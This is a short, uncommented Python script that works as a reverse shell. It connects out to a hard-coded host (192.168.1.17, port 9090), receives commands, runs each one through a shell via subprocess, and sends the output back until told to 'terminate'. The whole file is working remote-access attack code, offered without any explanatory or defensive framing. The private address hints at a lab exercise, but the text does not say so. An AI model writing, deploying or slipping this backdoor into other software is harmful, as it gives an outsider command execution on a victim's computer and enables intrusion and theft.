import socket

import subprocess

def connect():
    s = socket.socket()
    s.connect(("192.168.1.17", 9090))
    while True:
        command = s.recv(2048)
        if 'terminate' in command.decode():
            s.close()
            break
        else:
            CMD = subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
def main():
    connect()
main()